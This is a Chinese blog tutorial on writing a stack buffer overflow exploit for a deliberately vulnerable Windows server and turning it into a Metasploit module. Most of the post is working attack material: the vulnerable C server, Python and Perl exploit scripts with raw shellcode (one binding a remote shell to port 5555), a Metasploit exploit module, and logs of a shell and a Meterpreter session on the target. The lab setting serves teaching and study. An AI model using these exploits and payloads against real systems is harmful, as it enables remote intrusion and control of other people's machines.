---
layout: post
title: "exploit编写笔记3——编写Metasploit exploit"
description: "exploit"
category: 技术
tags: [exploit]
---
{% include JB/setup %}

这是exploit编写笔记第三篇，编写metasploit exploit。
首先，编写一个带有缓冲区溢出漏洞的服务器端程序。

	// server.cpp : Defines the entry point for the console application.
	//
	
	#include "stdafx.h"
	
	#include <iostream.h>
	#include <winsock.h>
	#include <windows.h>
	
	//load windows socket
	#pragma comment(lib, "wsock32.lib")
	
	//Define Return Messages
	#define SS_ERROR 1
	#define SS_OK 0
	
	void pr( char *str)
	{
	   char buf[500]="";
	   strcpy(buf,str);
	}
	void sError(char *str)
	{
	   MessageBox (NULL, str, "socket Error" ,MB_OK);
	   WSACleanup();
	}
	
	int main(int argc, char **argv)
	{
	
	WORD sockVersion;
	WSADATA wsaData;
	
	int rVal;
	char Message[5000]="";
	char buf[2000]="";
	
	u_short LocalPort;
	LocalPort = 200;
	
	//wsock32 initialized for usage
	sockVersion = MAKEWORD(1,1);
	WSAStartup(sockVersion, &wsaData);
	
	//create server socket
	SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
	
	if(serverSocket == INVALID_SOCKET)
	{
	   sError("Failed socket()");
	   return SS_ERROR;
	}
	
	SOCKADDR_IN sin;
	sin.sin_family = PF_INET;
	sin.sin_port = htons(LocalPort);
	sin.sin_addr.s_addr = INADDR_ANY;
	
	//bind the socket
	rVal = bind(serverSocket, (LPSOCKADDR)&sin, sizeof(sin));
	if(rVal == SOCKET_ERROR)
	{
	   sError("Failed bind()");
	   WSACleanup();
	   return SS_ERROR;
	}
	
	//get socket to listen
	rVal = listen(serverSocket, 10);
	if(rVal == SOCKET_ERROR)
	{
	   sError("Failed listen()");
	   WSACleanup();
	   return SS_ERROR;
	}
	
	//wait for a client to connect
	SOCKET clientSocket;
	clientSocket = accept(serverSocket, NULL, NULL);
	if(clientSocket == INVALID_SOCKET)
	{
	   sError("Failed accept()");
	   WSACleanup();
	   return SS_ERROR;
	}
	
	int bytesRecv = SOCKET_ERROR;
	while( bytesRecv == SOCKET_ERROR )
	{
	   //receive the data that is being sent by the client max limit to 5000 bytes.
	   bytesRecv = recv( clientSocket, Message, 5000, 0 );
	
	   if ( bytesRecv == 0 || bytesRecv == WSAECONNRESET )
	   {
	      printf( "\nConnection Closed.\n");
	      break;
	   }
	}
	
	//Pass the data received to the function pr
	pr(Message);
	
	//close client socket
	closesocket(clientSocket);
	//close server socket
	closesocket(serverSocket);
	
	WSACleanup();
	
	return SS_OK;
	}

向该服务程序发送超过500字节的数据时，会造成其崩溃。下面的python脚本会出发崩溃：

	import socket
	
	data = 'A' * 1000
	s= socket.socket()
	s.connect(('localhost',200))
	s.send(data)
	s.close()

![](/assets/img/metasploit/1.png)

使用mona pattern确定其eip偏移在504。

![](/assets/img/metasploit/2.png)


![](/assets/img/metasploit/3.png)

查找一个push esp ;ret 序列，我们找的是71a22b53，用这个值覆盖eip。shellcode我们随便使用一个Messagebox。

得到一个如下的python脚本：

	import socket
	
	data = "A" * 504
	
	#71a22b53  
	data += "\x53\x2b\xa2\x71"
	shellcode = ("\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
	    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
	    "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
	    "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
	    "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
	    "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
	    "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
	    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
	    "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
	    "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
	    "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
	    "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
	    "\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"
	    "\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
	    "\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"
	    "\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"
	    "\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"
	    "\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"
	    "\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"
	    "\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57"
	    "\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"
	    "\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"
	    "\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"
	    "\x40\xFF\x54\x24\x40\x57\xFF\xD0")
	data+=shellcode
	s= socket.socket()
	s.connect(('localhost',200))
	s.send(data)
	s.close()

运行成功：


![](/assets/img/metasploit/4.png)

我们再使用一个绑定端口的的payload，下面的payload将shell绑定到tcp 5555端口：

	#
	print " --------------------------------------\n";
	print "     Writing Buffer Overflows\n";
	print "       Peter Van Eeckhoutte\n";
	print "     http://www.corelan.be:8800\n";
	print " --------------------------------------\n";
	print "    Exploit for vulnserver.c\n";
	print " --------------------------------------\n";
	use strict;
	use Socket;
	my $junk = "\x90" x 504;
	
	#jmp esp (from ws2_32.dll)
	my $eipoverwrite = pack('V',0x71a22b53);
	
	#add some NOP's
	my $shellcode="\x90" x 50;
	
	# windows/shell_bind_tcp - 702 bytes
	# http://www.metasploit.com
	# Encoder: x86/alpha_upper
	# EXITFUNC=seh, LPORT=5555, RHOST=
	$shellcode=$shellcode."\x89\xe0\xd9\xd0\xd9\x70\xf4\x59\x49\x49\x49\x49\x49\x43" .
	"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58" .
	"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" .
	"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" .
	"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x42\x4a" .
	"\x4a\x4b\x50\x4d\x4d\x38\x4c\x39\x4b\x4f\x4b\x4f\x4b\x4f" .
	"\x45\x30\x4c\x4b\x42\x4c\x51\x34\x51\x34\x4c\x4b\x47\x35" .
	"\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x44\x38\x45\x51\x4a\x4f" .
	"\x4c\x4b\x50\x4f\x44\x58\x4c\x4b\x51\x4f\x47\x50\x43\x31" .
	"\x4a\x4b\x47\x39\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e" .
	"\x50\x31\x49\x50\x4a\x39\x4e\x4c\x4c\x44\x49\x50\x42\x54" .
	"\x45\x57\x49\x51\x48\x4a\x44\x4d\x45\x51\x48\x42\x4a\x4b" .
	"\x4c\x34\x47\x4b\x46\x34\x46\x44\x51\x38\x42\x55\x4a\x45" .
	"\x4c\x4b\x51\x4f\x51\x34\x43\x31\x4a\x4b\x43\x56\x4c\x4b" .
	"\x44\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b" .
	"\x44\x43\x46\x4c\x4c\x4b\x4b\x39\x42\x4c\x51\x34\x45\x4c" .
	"\x45\x31\x49\x53\x46\x51\x49\x4b\x43\x54\x4c\x4b\x51\x53" .
	"\x50\x30\x4c\x4b\x47\x30\x44\x4c\x4c\x4b\x42\x50\x45\x4c" .
	"\x4e\x4d\x4c\x4b\x51\x50\x44\x48\x51\x4e\x43\x58\x4c\x4e" .
	"\x50\x4e\x44\x4e\x4a\x4c\x46\x30\x4b\x4f\x4e\x36\x45\x36" .
	"\x51\x43\x42\x46\x43\x58\x46\x53\x47\x42\x45\x38\x43\x47" .
	"\x44\x33\x46\x52\x51\x4f\x46\x34\x4b\x4f\x48\x50\x42\x48" .
	"\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x46\x30\x4b\x4f\x48\x56" .
	"\x51\x4f\x4c\x49\x4d\x35\x43\x56\x4b\x31\x4a\x4d\x45\x58" .
	"\x44\x42\x46\x35\x43\x5a\x43\x32\x4b\x4f\x4e\x30\x45\x38" .
	"\x48\x59\x45\x59\x4a\x55\x4e\x4d\x51\x47\x4b\x4f\x48\x56" .
	"\x51\x43\x50\x53\x50\x53\x46\x33\x46\x33\x51\x53\x50\x53" .
	"\x47\x33\x46\x33\x4b\x4f\x4e\x30\x42\x46\x42\x48\x42\x35" .
	"\x4e\x53\x45\x36\x50\x53\x4b\x39\x4b\x51\x4c\x55\x43\x58" .
	"\x4e\x44\x45\x4a\x44\x30\x49\x57\x46\x37\x4b\x4f\x4e\x36" .
	"\x42\x4a\x44\x50\x50\x51\x50\x55\x4b\x4f\x48\x50\x45\x38" .
	"\x49\x34\x4e\x4d\x46\x4e\x4a\x49\x50\x57\x4b\x4f\x49\x46" .
	"\x46\x33\x50\x55\x4b\x4f\x4e\x30\x42\x48\x4d\x35\x51\x59" .
	"\x4c\x46\x51\x59\x51\x47\x4b\x4f\x49\x46\x46\x30\x50\x54" .
	"\x46\x34\x50\x55\x4b\x4f\x48\x50\x4a\x33\x43\x58\x4b\x57" .
	"\x43\x49\x48\x46\x44\x39\x51\x47\x4b\x4f\x4e\x36\x46\x35" .
	"\x4b\x4f\x48\x50\x43\x56\x43\x5a\x45\x34\x42\x46\x45\x38" .
	"\x43\x53\x42\x4d\x4b\x39\x4a\x45\x42\x4a\x50\x50\x50\x59" .
	"\x47\x59\x48\x4c\x4b\x39\x4d\x37\x42\x4a\x47\x34\x4c\x49" .
	"\x4b\x52\x46\x51\x49\x50\x4b\x43\x4e\x4a\x4b\x4e\x47\x32" .
	"\x46\x4d\x4b\x4e\x50\x42\x46\x4c\x4d\x43\x4c\x4d\x42\x5a" .
	"\x46\x58\x4e\x4b\x4e\x4b\x4e\x4b\x43\x58\x43\x42\x4b\x4e" .
	"\x48\x33\x42\x36\x4b\x4f\x43\x45\x51\x54\x4b\x4f\x48\x56" .
	"\x51\x4b\x46\x37\x50\x52\x50\x51\x50\x51\x50\x51\x43\x5a" .
	"\x45\x51\x46\x31\x50\x51\x51\x45\x50\x51\x4b\x4f\x4e\x30" .
	"\x43\x58\x4e\x4d\x49\x49\x44\x45\x48\x4e\x46\x33\x4b\x4f" .
	"\x48\x56\x43\x5a\x4b\x4f\x4b\x4f\x50\x37\x4b\x4f\x4e\x30" .
	"\x4c\x4b\x51\x47\x4b\x4c\x4b\x33\x49\x54\x42\x44\x4b\x4f" .
	"\x48\x56\x51\x42\x4b\x4f\x48\x50\x43\x58\x4a\x50\x4c\x4a" .
	"\x43\x34\x51\x4f\x50\x53\x4b\x4f\x4e\x36\x4b\x4f\x48\x50" .
	"\x41\x41";
	
	# initialize host and port
	my $host = shift || '192.168.10.130';
	my $port = shift || 200;
	
	my $proto = getprotobyname('tcp');
	
	# get the port address
	my $iaddr = inet_aton($host);
	my $paddr = sockaddr_in($port, $iaddr);
	
	print "[+] Setting up socket\n";
	# create the socket, connect to the port
	socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
	print "[+] Connecting to $host on port $port\n";
	connect(SOCKET, $paddr) or die "connect: $!";
	
	print "[+] Sending payload\n";
	print SOCKET $junk.$eipoverwrite.$shellcode."\n";
	
	print "[+] Payload sent\n";
	print "[+] Attempting to telnet to $host on port 5555...\n";
	system("telnet $host 5555");
	
	close SOCKET or die "close: $!";

下面是输出：

	root@kali:~# perl sploit.pl 192.168.10.130 200
	 --------------------------------------
	     Writing Buffer Overflows
	       Peter Van Eeckhoutte
	     http://www.corelan.be:8800
	 --------------------------------------
	    Exploit for vulnserver.c
	 --------------------------------------
	[+] Setting up socket
	[+] Connecting to 192.168.10.130 on port 200
	[+] Sending payload
	[+] Payload sent
	[+] Attempting to telnet to 192.168.10.130 on port 5555...
	Trying 192.168.10.130...
	Connected to 192.168.10.130.
	Escape character is '^]'.
	Microsoft Windows XP [�汾 5.1.2600]
	(C) ��Ȩ���� 1985-2001 Microsoft Corp.
	
	D:\Program Files\Microsoft Visual Studio\MyProjects\server\Debug>dir
	dir
	 ������ D �еľ�û�б�ǩ��
	 �������к��� 0EAA-0461
	
	 D:\Program Files\Microsoft Visual Studio\MyProjects\server\Debug ��Ŀ¼
	
	2014-04-07  17:22    <DIR>          .
	2014-04-07  17:22    <DIR>          ..
	2014-04-07  16:56           172,124 server.exe
	2014-04-07  16:56           185,136 server.ilk
	2014-04-07  16:56            25,594 server.obj
	2014-04-07  17:22            43,520 server.opt
	2014-04-07  16:56           203,728 server.pch
	2014-04-07  16:56           353,280 server.pdb
	2014-04-07  16:56             2,203 StdAfx.obj
	2014-04-07  17:23            91,136 vc60.idb
	2014-04-07  16:56           135,168 vc60.pdb
	               9 ���ļ�      1,211,889 �ֽ
	               2 ��Ŀ¼ 16,896,925,696 �����ֽ
	
成功得到了存在漏洞服务器的shell。

将exploit转换成metasploit，现在先贴代码，以后有时间仔细研究这个的写法。

	#
	#
	# Custom metasploit exploit for vulnserver.c
	# Written by Peter Van Eeckhoutte
	#
	#
	require 'msf/core'
	
	class Metasploit3 < Msf::Exploit::Remote
	
	      include Msf::Exploit::Remote::Tcp
	
	      def initialize(info = {})
	                super(update_info(info,
	                        'Name'           => 'Custom vulnerable server stack overflow',
	                        'Description'    => %q{
	                                        This module exploits a stack overflow in a 
	                                        custom vulnerable server.
	                                             },
	                        'Author'         => [ 'Terenceli ' ],
	                        'Version'        => '$Revision: 9999 $',
	                        'DefaultOptions' =>
	                                {
	                                        'EXITFUNC' => 'process',
	                                },
	                        'Payload'        =>
	                                {
	                                        'Space'    => 1400,
	                                        'BadChars' => "\x00\xff",
	                                },
	                        'Platform'       => 'win',
	
	                        'Targets'        =>
	                                [
	                                        ['Windows XP SP3 CHS',
	                                          { 'Ret' => 0x71a22b53, 'Offset' => 504 } ],
	                                        ['Windows 2003 Server R2 SP2',
	                                          { 'Ret' => 0x71c02b67, 'Offset' => 504  } ],
	                                ],
	                        'DefaultTarget' => 0,
	
	                        'Privileged'     => false
	                        ))
	
	                        register_options(
	                        [
	                                Opt::RPORT(200)
	                        ], self.class)
	       end
	
	       def exploit
	          connect
	
	          junk = make_nops(target['Offset'])
	          sploit = junk + [target.ret].pack('V') + make_nops(50) + payload.encoded
	          sock.put(sploit)
	
	          handler
	          disconnect
	
	       end
	
	end

在xpsp3上的测试：

	msf exploit(server) > set RHOST 192.168.10.130
	RHOST => 192.168.10.130
	msf exploit(server) > set payload windows/meterpreter/bind_tcp
	payload => windows/meterpreter/bind_tcp
	msf exploit(server) > exploit
	
	[*] Started bind handler
	[*] Sending stage (769024 bytes) to 192.168.10.130
	[*] Meterpreter session 2 opened (192.168.10.129:50459 -> 192.168.10.130:4444) at 2014-04-07 20:46:05 +0800
	
	meterpreter > sysinfo
	Computer        : CHINA-CE09C2DA6
	OS              : Windows XP (Build 2600, Service Pack 3).
	Architecture    : x86
	System Language : zh_CN
	Meterpreter     : x86/win32
